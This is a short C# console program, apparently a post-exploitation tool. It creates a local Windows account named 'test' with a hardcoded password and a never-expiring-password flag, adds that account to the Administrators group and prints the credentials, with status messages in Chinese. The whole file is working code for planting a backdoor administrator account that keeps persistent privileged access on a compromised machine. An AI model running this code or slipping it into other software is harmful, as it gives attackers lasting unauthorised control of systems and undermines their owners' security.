using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.DirectoryServices;
using System.Threading.Tasks;


namespace adduser
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var net = new DirectoryEntry("WinNT://" + Environment.MachineName);
                var users = net.Children.Add("test", "User");
                users.Invoke("SetPassword", "Hxc123456!");
                users.Invoke("Put", "UserFlags", 66049);
                users.CommitChanges();
                Console.WriteLine("[+] 添加用户成功");
                var group = net.Children.Find("Administrators", "group");
                if (group.Name != "")
                {
                    try
                    {
                        group.Invoke("Add", users.Path.ToString());
                        Console.WriteLine("[+] 添加用户组成功");
                        Console.WriteLine("Username:test Password:Hxc123456!");
                    }
                    catch
                    {
                        Console.WriteLine("[-] 添加用户组失败");
                    }
                }
                else
                {
                    Console.WriteLine("[-] 无此用户组");
                }
            }
            catch
            {
                Console.WriteLine("[-] 添加用户失败");
            }
        }
    }
}